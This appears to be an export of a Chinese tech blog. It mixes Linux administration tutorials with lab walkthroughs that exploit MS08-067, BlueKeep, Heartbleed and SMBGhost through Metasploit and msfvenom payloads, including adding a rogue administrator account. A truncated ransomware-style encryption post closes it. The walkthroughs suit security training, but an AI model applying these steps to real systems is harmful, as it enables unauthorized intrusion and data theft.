}\n    virtual_ipaddress {\t# 虚拟出的VIP\n        172.21.8.50/24\n    }\n}\n```\n\n* mariadb-2 的`/etc/keepalived/keepalived.conf` 的内容如下 \n\n全局配置段\n\n```bash\n! Configuration File for keepalived\n\nglobal_defs {\n   notification_email {\n     liuxp731@qq.com\n   }\n   notification_email_from Alexandre.Cassen@firewall.loc\n   smtp_server 127.0.0.1\n   smtp_connect_timeout 30\n   router_id db_slave\n   vrrp_skip_check_adv_addr\n   vrrp_strict\n   vrrp_garp_interval 0\n   vrrp_gna_interval 0\n}\n```\n\n启用 vrrp_script 模块， 定义对 mariadb 服务的监测\n\n```bash\nvrrp_script check_mariadb {\n   script \"/etc/keepalived/checkmariadb.sh\"\n   interval 2\n}\n```\n\nVRRPD 配置段\n\n```bash\nvrrp_instance mariadb-ha {\n    state BACKUP\n    interface ens224\n    virtual_router_id 60\n    priority 90\n    advert_int 1\n    authentication {\n        auth_type PASS\n        auth_pass 1111\n    }\n    track_script {\n        check_mariadb\n    }\n    virtual_ipaddress {\n        172.21.8.50/24\n    }\n```\n\n4. 在两个主机上编写服务检测脚本`/etc/keepalived/checkmariadb.sh`\n\n```bash\n#!/bin/bash\nif ! lsof -i:3306 &> /dev/null\nthen\n    systemctl stop keepalived\nfi\n```\n\n5. 启动两台服务器的`keepalived`\n\n```bash\nsystemctl start keepalived.service\n```\n\n![keepalived 配置成功](./keepalived-linux/7.png)\n\n可以看出mariadb-1主机已经多出来一个172.21.8.50/24的一个IP，这个就是虚拟出来的VIP，当mariadb-1主机宕掉，这个IP就会漂移到mariadb-2主机上，到这里就完成了mariadb双主复制和keepalived的实现。\n","tags":["MySQL","Linux"],"categories":["技术"]},{"title":"EVE导入CENTOS8的镜像","url":"/2023/05/31/eve-import-img/","content":"\n\n\n最近做python的三级项目，需要在EVE里面使用服务器的节点，因为EVE是不自带相关镜像的，只能通过自己导入的方式，全网的教程层出不穷，在借鉴学习了几篇文章后，简明精要的做出一下总结。\n\n### 前期准备\n\n首先需要EVE的导入镜像，我只用到了CENTOS8的，[相关链接](https://pan.baidu.com/s/14OK6FP1sUPU5KDQHexRLbA) 放在了云盘里，提取码：0731，需要自取。虚拟机的`user`用户和`root`密码均为`Test123`。\n\n<!-- more -->\n\n### 操作步骤\n\n1. 使用文件传输工具将镜像导入到eve的虚拟机里面，上传路径为`/opt/unetlab/addons/qemu/`\n\n2. 接着使用命令解压这个文件\n\n```bash\ntar -xf linux-centos-8.tgz\n```\n\n3. 执行命令修正权限。\n\n```bash\n/opt/unetlab/wrappers/unl_wrapper -a fixpermissions\n```\n\n>修正权限我也不知道不进行这步会报什么错，我没进行这步也能正常使用，总之，如果没有进行这步，然后遇到什么问题，不妨回来补一下这个操作。\n\n4. 最后大功告成，在EVE网页中可以使用了(鼠标右击-->node-->linux-->image)。\n\n![导入成功](./eve-import-img/1.png)\n\n---\n\n### 补充\n\n应***汪某人***的需求（作为一名出色的博主，应该做到尽善尽美），再补充一点内容。\n\n* 首先是EVE连接时有一个很坑的点，虚拟机打开时提示默认用户名是`root`，密码是`eve`。但其实密码是不对的，密码是`cisco`。不清楚是不是因为版本的问题。总之，如果`eve`不好使，就换成`cisco`试试。\n\n* 连接工具大多数人使用的都是Xshell和XFTP，这两个工具确实非常不错，但是后来本人在逛github时，发现一个非常好用的工具，这个工具是免费开源的，并且集合了Xshell远程命令的功能和XFTP的文件传输功能，还有额外的CMD窗口。支持windows视窗化查看虚拟机的文件。截图如下，[链接在这](https://github.com/kingToolbox/WindTerm/releases/download/2.5.0/WindTerm_2.5.0_Windows_Portable_x86_64.zip) 。\n\n![windterm](./eve-import-img/2.png)\n\n","tags":["EVE"],"categories":["学习过程"]},{"title":"关于seliunx的学习过程","url":"/2023/05/24/seliunx/","content":"\n### 修改文件SELinux的上下文\n\n#### 实验目的：修改文件的selinux上下文标签，把`/home/student`目录的selinux上下文标签替换为`/root`目录的selinux上下文标签。\n\n * 查看student目录的selinux\n\n```bash\n[root@servera home]# ls -dZ student/\nunconfined_u:object_r:user_home_dir_t:s0 student/\n```\n\n<!-- more -->\n\n**user_home_dir_t**的部分就是`/home/student`的selinux的上下文。\n\n * 查看root目录的selinux\n\n```bash\n[root@servera /]# ls -Zd /root/\nsystem_u:object_r:admin_home_t:s0 /root/\n```\n\n**admin_home_t**的部分就是`/root`的selinux的上下文。\n\n* 修改命令\n\n```bash\n[root@servera /]# semanage fcontext -a -t admin_home_t '/home/student(/.*)?'\n```\n\n`'/home/student(/.*)?'`部分后面的`(/.*)?`是固定的。\n\n* 使配置生效\n\n```bash\n[root@servera /]# restorecon -RFvv /home/student/\nRelabeled /home/student from unconfined_u:object_r:user_home_dir_t:s0 to system_u:object_r:admin_home_t:s0\nRelabeled /home/student/.bash_logout from unconfined_u:object_r:user_home_t:s0 to system_u:object_r:admin_home_t:s0\nRelabeled /home/student/.bash_profile from unconfined_u:object_r:user_home_t:s0 to system_u:object_r:admin_home_t:s0\nRelabeled /home/student/.bashrc from unconfined_u:object_r:user_home_t:s0 to system_u:object_r:admin_home_t:s0\nRelabeled /home/student/.ssh from unconfined_u:object_r:ssh_home_t:s0 to system_u:object_r:admin_home_t:s0\nRelabeled /home/student/.ssh/known_hosts from unconfined_u:object_r:ssh_home_t:s0 to system_u:object_r:admin_home_t:s0\nRelabeled /home/student/.ssh/authorized_keys from unconfined_u:object_r:ssh_home_t:s0 to system_u:object_r:admin_home_t:s0\nRelabeled /home/student/.bash_history from unconfined_u:object_r:user_home_t:s0 to system_u:object_r:admin_home_t:s0\n\n```\n\n* 再次查看student目录的selinux\n\n```bash\n[root@servera /]# ls -dZ /home/student/\nsystem_u:object_r:admin_home_t:s0 /home/student/\n```\n\n发现student目录的selinux值变成了**admin_home_t**。\n\n---","tags":["Linux"],"categories":["学习过程"]},{"title":"使用LVS+Nginx配置DR模式的Web集群","url":"/2023/05/18/LVS-Nginx-DR/","content":"\n### 准备工作\n\n需要最少准备三台虚拟机，关闭selinx和防火墙。\n\n||||||||\n|:-:|:-:|:-:|:-:|:-:|:-:|:-:|\n|主机名|身份|网络接口|连接模式|IP地址|软件|\n|DS|调度服务器|ens224|仅主机|172.21.8.80/24|ipvsadm|\n|web1|真实服务器|ens224|仅主机|172.21.8.20/24|nginx|\n|web1|真实服务器|lo(VIP)|-|172.21.8.80/32|nginx|\n|web2|真实服务器|ens224|仅主机|172.21.8.30/24|nginx|\n|web2|真实服务器|lo(VIP)|-|172.21.8.80/32|nginx|\n\nPS:\n\n1. 建议DS（调度机）的网卡使用仅主机模式的。\n2. web1和web2的loopback网卡都要设置为DS主机的metric值大的那一张网卡。\n<!-- more -->\n3. 可以使用```route -n```查看**metric**值。\n4. **metric**值可以在网卡配置文件中修改，修改后记得重启网络服务生效。\n\n### DS主机配置\n\n```bash\nipvsadm -A -t 172.21.8.80:80 -s wrr\nipvsadm -a -t 172.21.8.80:80 -r 172.21.8.20:80 -g -w 1\nipvsadm -a -t 172.21.8.80:80 -r 172.21.8.30:80 -g -w 2\nipvsadm --set 1 1 1\n```\n\n调度策略中，前面的这个IP是调度机虚拟出来的VIP，后面的这个IP是真实Web服务器的IP地址。\n\n也可以直接编辑成一个脚本文件，方便后面进行策略的调整\n\n```bash\n#!/bin/bash\nipvsadm -C\nipvsadm -A -t 10.8.7.10:80 -s wrr\nipvsadm -a -t 10.8.7.10:80 -r 10.8.7.80:80 -g -w 1\nipvsadm -a -t 10.8.7.10:80 -r 10.8.7.81:80 -g -w 2\nipvsadm -a -t 10.8.7.10:80 -r 10.8.7.82:80 -g -w 1\nipvsadm -a -t 10.8.7.10:80 -r 10.8.7.83:80 -g -w 2\nipvsadm --set 1 1 1\necho \"轮巡策略已成功添加！！！\"\n```\n\n### Web1主机和Web2主机配置\n\n* 配置回环接口（VIP）\n\n```bash\nip addr add 172.21.8.80/32 dev lo\n```\n\n因为环回口配置的IP在每次重启之后都会丢失IP，每次配置起来也比较麻烦，同样的把他写成一个脚本\n\n```bash\n#!/bin/bash\nip addr add 10.8.7.10/32 dev lo:1\necho \"VIP 已经成功添加到loopback口。\"\n```\n\n* 修改Web1内核控制系统arp响应\n\n  因为要修改4个文件，设置的值也比较简单。只有在使用LVS+Nginx配置DR模式的时候才会将这4个文件设置为该值，平常使用要使用默认值。为了切换方便一点，建议使用脚本的方式。\n\n```bash\n#!/bin/bash\nif [ $# -ne 1 ]\nthen\n    echo 'error!'\"usage:$0 on|off\"\n    exit 1\nfi\ncase $1 in\n    on)\n        echo \"1\" > /proc/sys/net/ipv4/conf/lo/arp_ignore\n        echo \"2\" > /proc/sys/net/ipv4/conf/lo/arp_announce\n        echo \"1\" > /proc/sys/net/ipv4/conf/all/arp_ignore\n        echo \"2\" > /proc/sys/net/ipv4/conf/all/arp_announce\n        echo \"LVS DR 模式已开启！\"\n        ;;\n    off)\n        echo \"0\" > /proc/sys/net/ipv4/conf/lo/arp_ignore\n        echo \"0\" > /proc/sys/net/ipv4/conf/lo/arp_announce\n        echo \"0\" > /proc/sys/net/ipv4/conf/all/arp_ignore\n        echo \"0\" > /proc/sys/net/ipv4/conf/all/arp_announce\n        echo \"LVS DR 模式已关闭！\"\n        ;;\n    *)\n        echo 'error!'\"usage:$0 on|off\"\n        exit 1\nesac\n```\n\n* 执行脚本\n\n```bash\nchmod +x lvs_dr.sh\n./lvs_dr.sh on\n```\n\n### 测试\n\n1. 在Web1、Web2启动Nginx。\n2. 分别执行```curl 172.21.8.20```，```curl 172.21.8.30```。验证无误后，在客户端（第4台机器）上测试```curl 172.21.8.80```，使用**DR**机器是不好使的。\n\n>版权声明：以上的shell脚本知识产权由私人所有，禁止商用。","tags":["Linux"],"categories":["技术"]},{"title":"Linux使用小tips","url":"/2023/05/18/linux-tips/","content":"\n### 常用的一些操作\n\n1. 永久修改SELINUX值。\n\n使用虚拟机进行一些服务的配置的时候，如果SELINX的值不调整为permissive，经常会出现一些稀奇古怪的错误，如果每次都开机设置```setenforce 0```就太麻烦了。所以直接编辑```/etc/selinux/config```文件，设置```SELINUX=permissive```，最后保存退出。\n\n2. 永久修改网卡的IP地址。\n\n在平常的服务器的配置时，总是会涉及到IP的变动，我个人使用最多的方法是直接修改配置文件。\n\n<!-- more -->\n\n网卡配置文件```/etc/sysconfig/network-scripts/ifcfg-ens160```。分成几点来说。\n\n* BOOTPROTO=none，可选值还有static、dhcp、auto。none和static功能一样，dhcp和auto功能一样。\n\n* ONBOOT=yes，设置开机网卡自启的，建议设置为*yes*，可选值还有*no*\n\n* 如果网卡一开始是使用动态获取的，改成手动后，就要通过编辑配置文件来进行IP的设置。只需要在文件的末尾加上\n\n```bash\nIPADDR=192.168.20.10    # *设置IP*\nGATEWAY=192.168.20.254    # *设置网关*\nPREFIX=24    # *设置子网掩码*\n```\n\n有的配置文件还可以看到\n\n```bash\nDNS1=8.8.8.8\nDNS2=114.144.144.114\n```\n\n但是我并不建议大家在这里设置DNS，一是根本不会起什么作用，因为使用DNS的还有另一个配置文件（```/etc/resolv.conf```），二就是它会和```/etc/resolv.conf```文件指定的DNS相互冲突。\n\n* 更改完配置文件后，IP并不会马上改变。需要手动进行一下重启。个人总结出来的一些经验，命令执行的顺序建议都不要改变。\n\n```bash\nsystemctl restart NetworkManager\nnmcli c d ens160\nnmcli c up ens160\n```\n\n这样**3**条命令下来，旧IP再顽固，也会无奈变成配置文件中的IP。","tags":["Linux"],"categories":["小玩意儿"]},{"title":"新的Linux虚拟机快速基本配置","url":"/2023/05/18/linux-init/","content":"\n### 配置阿里yum源\n\n1. 首先保证虚拟机可以正常访问网络。\n2. 执行命令，下载yum源。(CENTOS-7)\n\n```bash\ncurl -o /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo\n```\n\nCENTOS-8 yum源\n\n```bash\ncurl -o /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-8.repo\n```\n\n<!-- more -->\n\n3. 清除yum缓存，重新生成。\n\n```bash\nyum clean all && yum makecache\n```\n\nPS:\n\n**CENTOS-7和CENTOS-8的yum源最好不要混着使用，是什么版本就用什么版本。**\n\n### 必备的软件\n\n1. **vim工具**，最小化环境是没有vim的，vim和vi的区别在最小化环境里表现的就是配置文档的高亮显示了，强烈建议安装vim。\n\n```bash\nyum install -y vim\n```\n\n2. **wget**工具，用来下载一些网络资源，同样最小化是没有的，所以要下载一个。\n\n```bash\nyum install -y wget\n```\n\n3. **bash-completion**包，从名字就可以看出来，这是用来命令补全的，简直不要太好用，<kbd>Tab</kbd>键爱好者狂喜。\n\n```bash\nyum install -y bash-completion\n``` \n\n4. **tree工具**，使用图形的方式展示目录下的文件结构，不用的时候吃灰也不会少，用的时候就知道这个的好处了。\n\n```bash\nyum install -y tree\n```\n\n6. **net-tools**，这个工具提供了比如`ifconfig`，`netstat`，`arp`，`route`命令，有时候用起来发现没有这个命令的话，记得安装这个包。\n\n```bash\nyum install -y net-tools\n```\n\n5. **lsof工具**，查看端口监听的常用工具，个人来讲使用频率高于`netstat`，使用也比较方便，可以安装一个。\n\n```bash\nyum install -y lsof\n```\n\n配置完这些，基础的东西就可以告一段落了。","tags":["Linux"],"categories":["小玩意儿"]},{"title":"使用LVS+Nginx配置NAT模式的Web集群","url":"/2023/05/17/LVS-Nginx-NAT/","content":"\n### 准备条件\n\n需要最少准备三台虚拟机，关闭selinx和防火墙。\n\n|||||||||\n|:-:|:-:|:-:|:-:|:-:|:-:|:-:|:-:|\n|主机名|身份|网络接口|连接模式|IP地址|网关|软件|\n|DS|调度服务器|ens160|nat|192.168.20.40/24|192.168.20.254|ipvsadm|\n|DS|调度服务器|ens224|仅主机|172.21.8.10/24|-|ipvsadm|\n|web1|真实服务器|ens224|仅主机|172.21.8.20/24|172.21.8.10/24|nginx|\n|web2|真实服务器|ens224|仅主机|172.21.8.30/24|172.21.8.10/24|nginx|\n\nPS:\n\n1. DS一定是两块网卡，并且用一张网卡去作为真实服务器的网关。\n2. DS的两块网卡最好模式是不一样的。\n\n<!-- more -->\n\n### DS的配置\n\n下载ipvsadm\n\n```bash\nyum install -y ipvsadm\n```\n\n添加一个虚拟服务指定运输层协议为TCP、VIP为192.168.20.40、端口为80、调度算法为加权轮训。\n\n```bash\nipvsadm -A -t 192.168.20.40:80 -s rr\n```\n\n为虚拟服务器添加后端真实服务器\n\n```bash\nipvsadm -a -t 192.168.20.40:80 -r 172.21.8.20:80 -m\n```\n\n```bash\nipvsadm -a -t 192.168.20.40:80 -r 172.21.8.20:80 -m\n```\n\n使用命令查看生成的策略\n\n```bash\nipvsadm -Ln\n```\n\n开启路由转发功能\n\n```bash\necho \"1\" > /proc/sys/net/ipv4/ip_forward\n```\n\n使用命令修改轮训的时间\n\n```bash\nipvsadm --set 1 1 1\n```\n\n使用命令查看超时时间设置\n\n```bash\nipvsadm -L --timeout\n```\n\n### WEB1配置\n\n下载Nginx\n\n```bash\nyum install -y nginx\n```\n\nnginx的配置文件保存在```/etc/nginx/nginx.conf```\n\n使用命令去掉Nginx配置文件的空行和注释行\n\n```bash\negrep -v \"^[[:space:]]*#|^$\" nginx.conf.default > nginx.conf\n```\n\n修改配置文件\n\n```bash\nworker_processes  1;\nevents {\n    worker_connections  1024;\n}\nhttp {\n    include       mime.types;\n    default_type  application/octet-stream;\n    sendfile        on;\n    keepalive_timeout  65;\n    server {\n        listen       80;\n        server_name  172.21.8.20;    # 本机IP\n        location / {\n            root   /web;    # 根目录地址\n            index  index.html index.htm;    # 要去寻找的文件\n        }\n        error_page   500 502 503 504  /50x.html;\n        location = /50x.html {\n            root   html;\n        }\n    }\n}\n```\n\n创建HTML资源文件\n\n```bash\nmkdir /web\n```\n\n编辑网页入口文件\n\n```bash\ntouch /web/index.html\necho \"web1111\" > /web/index.html\n```\n\n开启Nginx服务\n\n```bash\nnginx\n```\n\n验证服务开启\n\n```bash\nlsof -i:80\n```\n\n### WEB2配置\n\nweb2配置基本同web1。\n\n使用命令去掉Nginx配置文件的空行和注释行\n\n```bash\negrep -v \"^[[:space:]]*#|^$\" nginx.conf.default > nginx.conf\n```\n\n修改配置文件\n\n```bash\nworker_processes  1;\nevents {\n    worker_connections  1024;\n}\nhttp {\n    include       mime.types;\n    default_type  application/octet-stream;\n    sendfile        on;\n    keepalive_timeout  65;\n    server {\n        listen       80;\n        server_name  172.21.8.30;\n        location / {\n            root   /web;\n            index  index.html index.htm;\n        }\n        error_page   500 502 503 504  /50x.html;\n        location = /50x.html {\n            root   html;\n        }\n    }\n}\n```\n\n创建HTML资源文件\n\n```bash\nmkdir /web\n```\n\n编辑网页入口文件\n\n```bash\ntouch /web/index.html\necho \"web2222\" > /web/index.html\n```\n\n开启Nginx服务\n\n```bash\nnginx\n```\n\n验证服务开启\n\n```bash\nlsof -i:80\n```\n\n### 测试\n\n先在web1主机\n\n```bash\ncurl 172.21.8.20\n```\n\n然后在web2主机\n\n```bash\ncurl 172.21.8.30\n```\n\n最后在DS主机上\n\n```bash\ncurl 192.168.20.40\n```\n\n如果观察到```web1111```和```web2222```来回显示在页面上则配置成功。\n\n### 其他可能用到的命令\n\nLinux查看路由表\n\n```bash\nip r s\n```\n\n重启Nginx的命令\n\n```bash\nnginx -s reload\n```\n\n关闭Nginx的命令\n\n```bash\nnginx -s stop\n```","tags":["Linux"],"categories":["技术"]},{"title":"CVE漏洞成功复现的玄学条件","url":"/2023/05/07/CVE-extend/","content":"\n### 正文\n\n总结一下漏洞复现得出来的几点体会，之前在永恒之黑文章里就已经提过几次了。\n\n但还是有两点得补充一下\n\n<!-- more -->\n\n1. 在被kali攻击过一次之后，倘若没有拿到meterpreter，这个时候一般第二次也不会成功的，即便你所有的操纵都是对的。这个时候一定要重启靶机的系统。\n\n2. 设置攻击参数的时候，一定要看好参数，尤其是系统存在两个网卡的，一定要看攻击机的IP是不是和靶机的IP在同一个网段的。","tags":["网络安全"],"categories":["技术"]},{"title":"远程命令执行（ms08-067）（CVE-2008-4250）","url":"/2023/04/23/ms08-067/","content":"\n### 准备工作\n\n攻击机：kali，差不多的版本都可以，我用的是Linux kali 6.1.0-kali5-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.12-1kali2 (2023-02-23) x86_64 GNU/Linux，可以使用命令```uname -a```查看。\n\n靶机：XP windows，下载链接，推荐使用电脑版的腾讯微云下载，这是目前我找到的最好用的ed2k的下载工具了。\n\n<!-- more -->\n\n```\ned2k://|file|sc_winxp_tablet_2005_CD1.iso|629227520|505B810E128351482AF8B83AC4D04FD2|/\n```\n\n### 域内扫描\n\n攻击第一步，先扫描网络内存活并可以利用的主机。\n\n```\nnmap -T4 -A -v -Pn 192.168.20.1/24\n```\n\n### 开始攻击\n\n1. 执行```msfconsole -q```。\n2. 搜索```ms08-067```。\n\n![开启工具](./ms08-067/1.png)\n\n3. 设置攻击前必要的参数。从上图看到，只有一个可用的模块。我们就使用这个模块。然后可以使用```show options```先查看都需要让我们设置哪些参数。\n\n![使用模块](./ms08-067/2.png)\n\n4. 设置参数。上图看到，我们需要设置```rhosts```（靶机IP）。\n\n![设置参数](./ms08-067/3.png)\n\n5. 然后设置payload reverse_tcp\n\n![设置参数](./ms08-067/4.png)\n\n6. 最后设置靶机的类型，在这我选择34。\n\n![设置参数](./ms08-067/5.png)\n\n7. 设置好就可以开始攻击了。\n\n![设置参数](./ms08-067/6.png)\n\n最后返回meterpreter，攻击成功。","tags":["网络安全"],"categories":["技术"]},{"title":"在OpenStack上分发虚拟机实例","url":"/2023/04/23/openstack-deploy/","content":"\n### 镜像\n\nOpenStack的存放镜像的位置在image目录下，作为演示，我们待会就使用这个cirros镜像。\n\n![镜像](https://lxp731.github.io/img/openstack/images.png)\n\n### 规格\n\nOpenStack分发虚拟机时，可以自定义一个分发的模板，这个模板就在flavors目录下，此时还是空，我们先创建一个flavor。\n\n<!-- more -->\n\n![模板](https://lxp731.github.io/img/openstack/flavors.png)\n\n按照自己的需求，可以创建flavor模板\n\n| | |\n|:--|:--|\n|VCPU|虚拟CPU的数量|\n|ID|默认就好|\n|RAM|内存大小|\n|ROOT DISK|根磁盘大小|\n|其他选项|全部默认|\n\n![flavor](https://lxp731.github.io/img/openstack/create_flavors.png)\n\n创建好之后，就会生成这样的一个flavor。\n\n![flavor](https://lxp731.github.io/img/openstack/succeed_flavors.png)\n\n### 网络\n\n和分发规格一样，我们同时可以自定义网络的模板,默认是会存在一个模板的，我们使用默认的模板，不再进行创建新的模板了，当然你可以按照个人的需求进行创建。\n\n![network](https://lxp731.github.io/img/openstack/network.png)\n\n### 发放虚拟机实例\n\n我们到project的instances目录，这里还没有虚拟机实例，我们来创建一个。\n\n![network](https://lxp731.github.io/img/openstack/instances.png)\n\n1. 点击右上角的```launch instances```。\n\n2. 设置details，名字自己起，描述选填，其他默认就好，然后next。\n\n![network](https://lxp731.github.io/img/openstack/details.png)\n\n3. 设置source，为了节省空间我选择不再创建新的卷，然后将下面的模板直接应用，点旁边的上箭头应用，然后next。\n\n![network](https://lxp731.github.io/img/openstack/source.png)\n\n4. 设置flavor，这里有我们刚刚创建的flavor模板，我们直接点旁边的上箭头。\n\n![network](https://lxp731.github.io/img/openstack/flavor.png)\n\n5. 最后设置network，默认已经选好了。那么，计算资源，存储资源，网络资源我们都配置好了，就可以直接发布虚拟机了，点击右下角的按钮分发实例。\n\n6. 稍作等待，就会出现下面这个页面，等实例处于active时，就大功告成了。\n\n![network](https://lxp731.github.io/img/openstack/finish.png)","tags":["Openstack"],"categories":["探索"]},{"title":"远程桌面提权（CVE-2019-0708）","url":"/2023/04/22/CVE-2019-0708/","content":"\n### 准备工作\n\n首先需要准备两台虚拟机，一台运行kali linux，另一台运行的是windows7，目标机开启3389端口,关闭防火墙，在计算机高级系统设置中远程桌面设置允许。\n\n### 开始攻击\n\n1. 还是使用我们熟悉的```msfconsole```工具,进入之后搜索***0708***。\n\n<!-- more -->\n\n![启动工具](./CVE-2019-0708/1.png)\n\n2. 使用编号是1的模块，然后设置***payload***，这是为了攻击成功之后不会蓝屏，而是给我们弹回一个```shell```。使用```options```查看需要设置的参数，从图中可以看到需要设置目标机器的IP。\n\n![启动工具](./CVE-2019-0708/2.png)\n\n3. 我们需要额外设置一个参数```targets```。使用```show targets```查看选项，选择最贴合我们情况的，我选择了windows的VMware。\n\n![启动工具](./CVE-2019-0708/3.png)\n\n4. 设置完就可以run起来了，稍作等待，成功返回```shell```,验证一下我们的权限，是系统用户没有错。\n\n![启动工具](./CVE-2019-0708/4.png)\n\n5. 我们尝试在系统中添加一个用户***hacker***，密码设置为“1234”。\n\n![启动工具](./CVE-2019-0708/5.png)\n\n6. 然后把***hacker***添加到管理员组。\n\n![启动工具](./CVE-2019-0708/6.png)\n\n7. 再启动一个终端，输入```rdesktop 192.168.20.130```，这里跟着的是目标机器的IP。然后kali会弹出一个新页面，就是windows的登录页面，我们使用刚刚创建的用户和密码登录。\n\n![启动工具](./CVE-2019-0708/7.png)\n\n8. 最后kali成功远程登录windows，任务完成。\n\n![启动工具](./CVE-2019-0708/8.png)","tags":["网络安全"],"categories":["技术"]},{"title":"心脏滴血原理与复现","url":"/2023/04/22/heartbleed/","content":"\n### 前期准备\n\n攻击机器还是kali，靶机这里用到的是[beebox](https://sourceforge.net/projects/bwapp/files/bee-box/)，下载完之后解压导入虚拟机就可以开始使用了。\n\n### nmap扫描\n\n攻击发起前，肯定是kali先进行扫描，查看同一网段哪些机器在线。\n\n<!-- more -->\n\n```bash\n  nmap -T4 -A -v -Pn 192.168.20.1/24\n```\n\n扫描完成后发现有一台192.168.20.136的机器在线，复现心脏滴血用到的端口是8443。\n\n![扫描结果](./heartbleed/1.png)\n\n### 脚本探测\n\n看到机器在线后，使用一个工具探测其8443端口是否可以利用，查看靶机是否有可以利用的机会。\n\n```bash\n  nmap 192.168.20.136 -p 8443 --script ssl-heartbleed.nse\n```\n\n文字显示是“VULNERABLE”，代表漏洞可以被利用。\n\n![脚本探测](./heartbleed/2.png)\n\n### 开始攻击\n\n打开```msfconsole```工具，搜索```heartbleed```，使用1。\n\n```bash\n  msfconsole -q\n  search heartbleed\n  use 1\n```\n\n![参数设置](./heartbleed/4.png)\n\n使用```show options```查看相应的参数并设置，包括```rport```，```rhost```，```verbose```。\n\n```bash\n  set rport 8443\n  set rhost 192.168.20.136\n```\n\n![参数设置](./heartbleed/5.png)\n\n![参数设置](./heartbleed/8.png)\n\n其中```verbose```是要在```show advanced```下查看的，默认是```false```，我们```set verpose true```设置为```true ```，只有这样我们才能明文显示（终端显示）我们拿到的64K的数据。\n\n```bash\n  show advanced\n  set verbose true\n```\n\n![参数设置](./heartbleed/3.png)\n\n最后可以用```show missing```查看遗漏的设置参数，没有遗漏，就可以开始运行了。\n\n```bash\n  show missing\n  run\n```\n\n![参数设置](./heartbleed/6.png)\n\nkali在这边运行着，然后回到靶机上随便点点点，只要发生操作，就会有数据外泄。\n\n![参数设置](./heartbleed/9.png)\n\n最后我们回到kali，发现已经拿到数据了。\n\n![参数设置](./heartbleed/7.png)\n\n心脏滴血的复现到这里就完成了。","tags":["网络安全"],"categories":["技术"]},{"title":"永恒之黑（CVE-2020-0796）","url":"/2023/04/21/CVE-2020-0796/","content":"\n### 惭愧声明\n稍微了解一点就会知道，CVE-2020-0796是可以拿到shell的，但是因为技术能力的限制，到现在复现bug我也没有拿到shell，只会让靶机蓝屏重启。先把博客更了，等后续搞明白了，再来更新。\n\n### 准备工作\n\n首先，准备一台kali和一台运行1903版本或者1909版本的windows10。\n\n<!-- more -->\n\n关闭windows10的防火墙和实时保护功能。\n\n在kali上准备待会要用到的工具。\n\n1. 启用扫描脚本\n\n```git\n  git clone https://github.com/ollypwn/SMBGhost.git\n```\n\n有人说这个脚本不准确，有时候检测超时也会报bug可利用，这个脚本也不太重要，至少对于这个实验来说。\n\n2. 下载EXP脚本\n\n```git\n  git clone https://github.com/chompie1337/SMBGhost_RCE_PoC.git\n```\n\n### 扫描bug\n\n准备好扫描脚本后进入该目录，执行：\n\n```python\n  python3 scanner.py 192.168.20.135\n```\n\n\"192.168.20.135\"更换为自己靶机的IP。下面是效果图，显示\"Vulnerable\"，易受攻击的。\n\n![bug扫描](./CVE-2020-0796/1.png)\n\n### 准备payload\n\n进入使用EXP脚本的SMBGhost_RCE_PoC目录，执行：\n\n```bash\n  msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=4444 -f py -o payload\n```\n\n执行之后会在SMBGhost_RCE_PoC目录下生成payload文件。接下来很重要的步骤：\n\n1. 打开payload。\n\n2. 打开exploit.py。\n\n3. 将payload中“buf”字段全部替换为“USER_PAYLOAD”字段。\n\n4. 复制替换完成的payload文件内容。\n\n5. 粘贴到（覆盖）exploit.py文件USER_PAYLOAD区域。\n\n![修改payload](./CVE-2020-0796/2.png)\n\n### 开始攻击\n\n1. 启动```msfconsole```。\n\n2. 使用模块。\n\n3. 设置有效载荷和相关参数。\n\n依次执行以下命令：\n\n```bash\n  msfconsole -q\n  use exploit/multi/handler\n  set payload windows/x64/meterpreter/bind_tcp\n  set lport 4444\n  set rhost 192.168.20.135\n  run\n```\n\n![攻击](./CVE-2020-0796/3.png)\n\n再打开一个终端，进入SMBGhost_RCE_PoC目录，运行：\n\n```bash\n  python3 exploit.py -ip 192.168.20.135\n```\n\n![运行 exploit.py](./CVE-2020-0796/4.png)\n\n出现这步后按下回车。\n\n然后回到win10，发现win10蓝屏正在重启。\n\n![win10重启](./CVE-2020-0796/5.png)\n\n如果完成的彻底，```msfconsole```终端会弹出meterpreter，但是很遗憾，我没有拿到靶机的shell。\n\n![拿到shell](./CVE-2020-0796/6.png)\n\n---\n\n手动分割线\n\n---\n\n### 玄学排错\n\n接着上次的来说，上次是没有拿到shell的。经过一些网上拍错和别的同学的交流，得到了一些启发，最终成功拿到了shell。其中有很多问题也是很玄学的。\n\n1. 把靶机的内存设置大一点，我直接给到了8G。\n\n2. kali和靶机的连通最好不要使用NAT连接，如果使用NAT连接，建议把宿主机的防火墙和病毒保护也关闭。\n\n3. 在靶机中要在控制面板-程序-启用或关闭windows的功能-打开SMB开关，然后重启。\n\n4. 在进行paylod-code生成的时候，尽量不要使用原有的4444端口（我用的9876）。\n\n5. 更换了windows的镜像，重新安装了一个虚拟机，镜像保存在了[百度云盘](https://pan.baidu.com/s/1M1GvWoMcJc5nZA_tS4tang)里，提取码：0731。\n\n### 成功的尝试\n\n生成payload-code。\n\n![](./CVE-2020-0796/9.png)\n\n然后替换exploit.py文件中user_payload字段。\n\n![](./CVE-2020-0796/10.png)\n\n前面的操作还是一样，进入工具，使用模块，设置payload。\n\n![](./CVE-2020-0796/7.png)\n\n设置攻击参数。\n\n![](./CVE-2020-0796/8.png)\n\n执行run命令并在此等候。\n\n![](./CVE-2020-0796/11.png)\n\n然后再开一个终端\n\n![](./CVE-2020-0796/12.png)\n\n成功拿到shell，是管理员的权限没有错。\n\n![](./CVE-2020-0796/13.png)","tags":["网络安全"],"categories":["技术"]},{"title":"使用Python加密文件","url":"/2023/04/17/Python-encrypted-file/","content":"\n### 功能\n\n用Python实现对文件的加密和解密，即ransomware的代码原理实现。\n\n### 序\n\n如果你是直接copy的代码块，粘贴到pycharm后，你会看到.py文件会有一些导入包的报错。你可以自己去网上找教程进行下载。<!-- more -->比如[这个](https://blog.csdn.net/yilovexing/article/details/104011199)，也可以下载[我提供的文件](https://www.aliyundrive.com/s/HcrQHfdUYMi)，然后把下载两个文件夹复制到Python环境的`F:\\Python\\Lib\\site-packages\\`文件夹下面（我的Python安装在F盘，找到你自己的安装路径），这个文件夹保存了一些Python导的包。如果是自己下载的，下载完之后还是报错，也可以到这个文件夹下，检查一下Python中导包时from 